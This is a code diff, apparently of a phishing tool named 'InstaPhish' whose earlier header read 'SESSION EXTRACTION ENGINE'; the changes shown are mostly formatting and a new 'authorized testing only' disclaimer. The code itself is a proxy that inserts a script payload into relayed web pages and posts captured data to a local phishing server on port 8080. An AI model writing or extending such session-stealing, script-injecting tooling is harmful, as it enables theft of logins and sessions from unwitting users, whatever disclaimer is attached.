@@ -1,4 +1,9 @@
-/* HEADER: SESSION EXTRACTION ENGINE */
+/*
+ * InstaPhish - Response Inspector Module
+ * Copyright (c) 2024 r4tur1
+ * For authorized security testing and educational purposes only.
+ */
+
 #include <iostream>
 #include <string>
 #include <thread>
@@ -7,14 +12,15 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
-#include <pcap.h>
+#include <pcap/pcap.h>
 #include <websocketpp/config/asio_no_tls.hpp>
 #include <websocketpp/server.hpp>
 
-using ws_server = websocketpp::server<websocketpp::config::asio>;
+typedef websocketpp::server<websocketpp::config::asio> ws_server;
+
 const int PROXY_PORT = 9001;
 const int PHISH_PORT = 8080;
-const int WS_PORT = 9002;
+const int WS_PORT     = 9002;
 
 const std::string PAYLOAD = R"(
 <script>
@@ -41,7 +47,8 @@ void ws_listen() {
         addr.sin_port = htons(PHISH_PORT);
         inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);
         if (connect(sock, (sockaddr*)&addr, sizeof(addr)) >= 0) {
-            std::string req = "POST /s HTTP/1.1\r\nHost: localhost\r\nContent-Type: text/plain\r\nContent-Length: " + std::to_string(payload.size()) + "\r\n\r\n" + payload;
+            std::string req = "POST /s HTTP/1.1\r\nHost: localhost\r\nContent-Type: text/plain\r\nContent-Length: "
+                            + std::to_string(payload.size()) + "\r\n\r\n" + payload;
             send(sock, req.c_str(), req.size(), 0);
             close(sock);
         }
@@ -86,7 +93,9 @@ int main() {
             if (tag != std::string::npos) body.insert(tag, PAYLOAD);
             std::string final = head + "\r\n\r\n" + body;
             send(client, final.c_str(), final.size(), 0);
-        } else send(client, res.c_str(), res.size(), 0);
+        } else {
+            send(client, res.c_str(), res.size(), 0);
+        }
         close(backend);
         close(client);
     }
